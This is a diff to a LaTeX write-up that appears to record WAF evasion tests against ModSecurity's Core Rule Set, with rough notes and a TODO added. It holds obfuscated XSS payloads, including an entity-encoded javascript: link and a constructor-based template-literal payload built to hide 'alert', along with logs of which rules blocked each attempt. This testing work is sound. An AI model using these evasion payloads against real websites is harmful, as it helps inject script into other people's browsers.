@@ -1,5 +1,5 @@
-\section{Findings}
-\label{sec:Findings}
+\section{Evaluation Results}
+\label{sec:EvaluationResults}
 Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
 \begin{lstlisting}[style=basicStyle]
 	<a href=j&#97v&#97script&#x3A;
@@ -15,6 +15,52 @@ Combination of <a> with javascript in href injection, HTML ascii encoding, tagge
 	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
 \end{itemize}
 
+theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection
+
 \begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
 	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
 \end{lstlisting}
+
+
+tried to encode the  payload:
+\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
+	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
+\end{lstlisting}
+with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO
+
+weird unicode: tried using 
+\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
+	console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
+
+	but result is 
+{\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}
+\end{lstlisting}
+
+
+unicode tests:
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:unicodetests}]
+<payload>${`alert`}</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${`alert`}"</MatchedData>
+
+<payload>\u0024{alert`}</payload>
+<message>"Possible Unicode character bypass detected"</message>
+<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+<fileDetails>[line "1263"] [id "920540"]<fileDetails>
+<MatchedData>"x5cu0024"</MatchedData>
+
+<payload>encodeURIComponent('`\u0024{`alert`}')</payload>
+<payload>"%60%24%7B%60alert%60%7D"</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${`alert`}"</MatchedData>
+
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"eval("</MatchedData>
+\end{lstlisting}
+
+
